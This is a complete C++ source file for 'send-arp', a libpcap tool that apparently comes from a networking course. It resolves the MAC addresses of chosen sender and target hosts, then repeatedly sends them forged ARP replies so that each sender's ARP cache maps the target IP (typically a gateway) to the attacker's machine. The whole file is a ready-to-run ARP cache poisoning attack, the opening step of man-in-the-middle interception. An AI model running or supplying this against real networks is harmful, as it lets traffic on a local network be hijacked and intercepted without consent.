#include <cstdio>
#include <iostream>
#include <unistd.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <linux/if.h> /* IFNAMSIZ */
#include "ethhdr.h"
#include "arphdr.h"

#define MAX_ATTACK_CNT 0x10

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct st_ip {
    Ip sender_ip;
    Ip target_ip;
};

pcap_t *handle;

struct st_ip *st_ips;
Ip my_ip;
Mac my_mac;

void usage(void) 
{
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void destroy_arg(void)
{
    free(st_ips);
}

void parse_arg(int argc, char *argv[], char *interface)
{
    int cnt = argc / 2 - 1;

    st_ips = (struct st_ip *)calloc(cnt + 1, sizeof(struct st_ip));

    strncpy(interface, argv[1], IFNAMSIZ);

    for (int i = 0; i < cnt; i++) {
        st_ips[i].sender_ip = Ip(argv[i * 2 + 2]);
        st_ips[i].target_ip = Ip(argv[i * 2 + 3]);
    }

    /* If both sender_ip & target_ip are 0, it means that it is the end of the array. */
    st_ips[cnt].sender_ip = Ip::nullIp();
    st_ips[cnt].target_ip = Ip::nullIp();
}

int send_arp_packet(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, uint16_t op)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac; 
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}

Mac get_mac_by_ip(Ip ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    ArpHdr *arp_hdr;
    int ret;
    
    /* TODO: Test if it's a Mac address I've already found */

    ret = send_arp_packet(Mac::broadcastMac(), my_mac, Mac::nullMac(), my_ip, ip, ArpHdr::Request);
    if (ret != 0) {
        return Mac::nullMac();
    }

    while (true) {
        ret = pcap_next_ex(handle, &header, &packet);
        if (ret == 0)
            continue;
        if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", ret, pcap_geterr(handle));
            return Mac::nullMac();
        }

        arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));
        if (arp_hdr->op() == ArpHdr::Reply && my_ip == arp_hdr->tip() && my_mac == arp_hdr->tmac() && ip == arp_hdr->sip()) 
            break;
    }

    return arp_hdr->smac();
}

Mac get_my_mac(char *interface)
{
    struct ifreq ifr;
    Mac my_mac;
    int ret;
    int sk;

    sk = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, interface); 

    ret = ioctl(sk, SIOCGIFHWADDR, &ifr);
    close(sk);

    if (ret < 0) { 
        fprintf(stderr, "Cannot get a MAC address\n");
        my_mac = Mac::nullMac();
    } else {
        my_mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data); 
    }
        
    return my_mac;
}

Ip get_my_ip(char *interface)
{
    struct ifreq ifr;
    char ip_str[16];
    Ip my_ip;
    int ret;
    int sk;

    sk = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, interface); 

    ret = ioctl(sk, SIOCGIFADDR, &ifr);
    close(sk);
        
    if (ret < 0) {
        fprintf(stderr, "Cannot get a IP address\n");
        my_ip = Ip::nullIp();
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ip_str, sizeof(struct sockaddr));
        my_ip = Ip(ip_str);
    } 

    return my_ip;
}

int get_my_info(char *interface)
{
    my_ip = get_my_ip(interface);
    my_mac = get_my_mac(interface);

    if (my_ip.isNull() || my_mac.isNull())
        return -1; 

    return 0;
}

int main(int argc, char *argv[]) 
{
    int ret;
    char interface[IFNAMSIZ];
    char errbuf[PCAP_ERRBUF_SIZE];
    Mac sender_mac;
    Mac target_mac;

    if (argc < 4 && argc % 2) {
        usage();
        return 0;
    }

    parse_arg(argc, argv, interface);

    handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
        goto out_error;
    }

    ret = get_my_info(interface);
    if (ret < 0)
        goto out_error;

    for (int i = 0; !(st_ips[i].sender_ip.isNull() && st_ips[i].target_ip.isNull()); i++) {
        sender_mac = get_mac_by_ip(st_ips[i].sender_ip);
        target_mac = get_mac_by_ip(st_ips[i].target_ip);
        if (sender_mac.isNull() || target_mac.isNull())
            goto out_error;

        /* TODO: Send arp packets at the same time using thread */
        for (int j = 0; j < MAX_ATTACK_CNT; j++) {
            ret = send_arp_packet(sender_mac, my_mac, sender_mac, st_ips[i].target_ip, 
                                st_ips[i].sender_ip, ArpHdr::Reply);
            if (ret != 0)
                goto out_error;
        }
    }

    puts("Done!");

out_error:
    destroy_arg();
    if (handle)
        pcap_close(handle);

    return 0;
}
